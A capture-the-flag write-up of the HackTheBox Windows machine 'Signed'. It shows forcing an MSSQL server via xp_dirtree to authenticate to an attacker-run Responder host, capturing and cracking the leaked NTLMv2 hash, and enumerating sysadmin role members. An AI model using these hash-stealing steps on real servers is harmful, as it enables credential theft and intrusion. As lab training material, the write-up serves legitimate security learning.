# HackTheBox - Signed
OS: Windows
Difficulty: Medium

---

## Recon / Enumeration
- Port 1433 (MSSQL) discovered.
- Initial connection with provided creds using `mssqlclient.py`.

---

## Initial Access
With the help command we can see that MSSQL had xp_cmdshell disabled, but xp_dirtree available. With this we can use a relay attack to steal NTLM hashes.

Attacker:
- Start Responder on tun0:
```bash
responder -I tun0
```

MSSQL:
```sql
EXEC xp_dirtree '\\<attacker_ip>\any\thing';
```

Nice, we get something:
```
[SMB] NTLMv2-SSP Client   : <signed_ip>
[SMB] NTLMv2-SSP Username : SIGNED\<username>
[SMB] NTLMv2-SSP Hash     : username::SIGNED:<NTLMv2 hash>...
```

Now, crack the hash using john:
`john --wordlist=rockyou.txt hash.txt`
And we get password for the user.

Connect using:
```bash
mssqlclient.py 'SIGNED/<found_user>:<password>@<ip>' -windows-auth
```

---

## Enumeration inside MSSQL
Check server role memberships to find sysadmin group mapping:
```sql
SELECT p.name AS LoginName, p.type_desc AS LoginType
FROM sys.server_role_members AS rm
JOIN sys.server_principals AS r ON rm.role_principal_id = r.principal_id
JOIN sys.server_principals AS p ON rm.member_principal_id = p.principal_id
WHERE r.name = 'sysadmin' ORDER BY LoginName;
```
Output contains:
- SIGNED\IT (a domain group) as a member of sysadmin.

Get SID for SIGNED\IT:
```sql
SELECT SUSER_SID('SIGNED\IT');
-- hex: 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```
Convert to string the SID with a python program: S-1-5-21-4088429403-1159899800-2753317549-1103

---

